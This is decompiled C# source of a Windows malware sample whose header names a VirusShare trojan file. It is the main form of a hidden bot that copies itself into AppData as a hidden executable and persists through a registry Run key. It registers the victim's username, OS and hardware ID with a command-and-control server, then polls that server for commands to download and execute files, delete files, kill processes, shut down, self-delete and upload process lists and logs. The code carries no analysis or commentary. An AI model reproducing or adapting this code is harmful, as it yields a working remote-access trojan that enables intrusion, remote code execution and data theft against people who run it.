// Decompiled with JetBrains decompiler
// Type: network.Main
// Assembly: network, Version=1.0.0.6, Culture=neutral, PublicKeyToken=null
// MVID: B0A24E30-B253-4D4D-B01C-24ADDB2ED5EA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00033-msil\Trojan-Ransom.Win32.Blocker.ahhr-2d8467fb99e7020f788639b2a01340f22a0724c95184d9bd912f39130e095d14.exe.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using MyVT;
using network.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace network
{
  [DesignerGenerated]
  internal class Main : Form
  {
    private IContainer components;
    internal const bool Debug = false;
    internal const string WebSite = "http://boti.astria-serv.com/";
    internal const string FileNameLogs = "Appli_Logs.txt";
    private Thread ThVote;
    private Thread ThCommand;

    public Main()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.ThVote = new Thread(new ThreadStart(this.DoVote));
      this.ThCommand = new Thread(new ThreadStart(this.DoCommand));
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Main);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.TransparencyKey = SystemColors.Control;
      this.ResumeLayout(false);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        if (Operators.CompareString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe", Application.ExecutablePath, false) != 0 && !System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe"))
        {
          FileSystem.FileCopy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe");
          System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe", FileAttributes.Hidden);
        }
        MAJ.CheckMAJ();
        this.reg_run(Application.ProductName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe");
        WebClient Instance = new WebClient();
        NewLateBinding.LateCall((object) Instance, (System.Type) null, "DownloadString", new object[1]
        {
          Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("http://boti.astria-serv.com/command.php?a=registration&user=" + (Environment.UserName + "&os=" + MyProject.Computer.Info.OSFullName + "&region=" + RegionInfo.CurrentRegion.NativeName) + "&hwid="), this.Get_HWID()), (object) "&version="), (object) Application.ProductVersion)
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        Instance.Dispose();
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(this.LoadDllByResources);
        this.ThVote.SetApartmentState(ApartmentState.STA);
        this.ThVote.Start();
        this.ThCommand.SetApartmentState(ApartmentState.STA);
        this.ThCommand.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [STAThread]
    internal void DoVote()
    {
      try
      {
        new Vote().Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void OnChangeStateIsVoting(object sender, EventArgs e, bool IsVoting) => Logs.Write("[Appli] IsVoting = " + IsVoting.ToString());

    private Assembly LoadDllByResources(object sender, ResolveEventArgs args)
    {
      Assembly assembly;
      try
      {
        string name = "network." + new AssemblyName(args.Name).Name + ".dll";
        using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
        {
          byte[] numArray = new byte[checked ((int) (manifestResourceStream.Length - 1L) + 1)];
          manifestResourceStream.Read(numArray, 0, numArray.Length);
          assembly = Assembly.Load(numArray);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        assembly = (Assembly) null;
        ProjectData.ClearProjectError();
      }
      return assembly;
    }

    [STAThread]
    internal void DoCommand()
    {
      try
      {
        while (true)
        {
          try
          {
            string[] strArray1 = Conversions.ToString(NewLateBinding.LateGet((object) new WebClient(), (System.Type) null, "DownloadString", new object[1]
            {
              Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "http://boti.astria-serv.com/command.php?a=getcommand&hwid=", this.Get_HWID()), (object) "&version="), (object) Application.ProductVersion)
            }, (string[]) null, (System.Type[]) null, (bool[]) null)).Split('|');
            int index = 0;
            while (index < strArray1.Length)
            {
              string Left1 = strArray1[index];
              if (Operators.CompareString(Left1, "", false) != 0)
              {
                string[] strArray2 = Left1.Split('=');
                string Left2 = strArray2[1];
                if (Operators.CompareString(Left2, "DownloadAndExecute", false) == 0)
                {
                  Commandes.DownloadAndExecute(strArray2[2]);
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "OpenProgram", false) == 0)
                {
                  Commandes.OpenProgram(strArray2[2]);
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "Shutdown", false) == 0)
                {
                  Commandes.Shutdown();
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "Restart", false) == 0)
                {
                  Commandes.Restart();
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "DeleteFile", false) == 0)
                {
                  Commandes.DeleteFile(strArray2[2]);
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "CloseProcess", false) == 0)
                {
                  Commandes.CloseProcess(strArray2[2]);
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "DeleteMe", false) == 0)
                {
                  Commandes.DeleteMe();
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "MAJ", false) == 0)
                {
                  MAJ.CheckMAJ();
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "Get_Process", false) == 0)
                {
                  this.WriteData(Commandes.Get_Process());
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
                else if (Operators.CompareString(Left2, "Get_Logs", false) == 0)
                {
                  this.ReportLogs();
                  this.DeleteCommand(Conversions.ToInteger(strArray2[0]));
                }
              }
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Thread.Sleep(5000);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    internal void DeleteCommand(int id)
    {
      try
      {
        new WebClient().DownloadString("http://boti.astria-serv.com/command.php?a=delcommand&id=" + Conversions.ToString(id));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    internal void WriteData(string data, string action = "datas")
    {
      data = data.Replace("&", "%26");
      HttpWebRequest httpWebRequest = (HttpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
      {
        Operators.ConcatenateObject((object) ("http://boti.astria-serv.com/command.php?a=" + action + "&hwid="), this.Get_HWID())
      }, (string[]) null, (System.Type[]) null, (bool[]) null);
      byte[] bytes = new UTF8Encoding().GetBytes("datas=" + data);
      httpWebRequest.Method = "POST";
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      httpWebRequest.ContentLength = (long) bytes.Length;
      using (Stream requestStream = httpWebRequest.GetRequestStream())
        requestStream.Write(bytes, 0, bytes.Length);
      httpWebRequest.GetResponse();
    }

    internal void ReportLogs()
    {
      string logs = Logs.Logs;
      Logs.Logs = "";
      this.WriteData(logs, "logs");
    }

    internal void reg_run(string ApplicationName, string ApplicationPath)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        subKey.SetValue(ApplicationName, (object) ApplicationPath);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    internal void del_reg_run(string ApplicationName)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        subKey.DeleteValue(ApplicationName);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    internal object Get_HWID()
    {
      ManagementObjectCollection instances = new ManagementClass("win32_processor").GetInstances();
      ManagementObjectCollection.ManagementObjectEnumerator enumerator;
      try
      {
        enumerator = instances.GetEnumerator();
        if (enumerator.MoveNext())
          return (object) enumerator.Current.Properties["processorID"].Value.ToString();
      }
      finally
      {
        enumerator?.Dispose();
      }
      return (object) "";
    }

    internal object StrToBase64(string Str) => (object) Convert.ToBase64String(Encoding.UTF8.GetBytes(Str));
  }
}
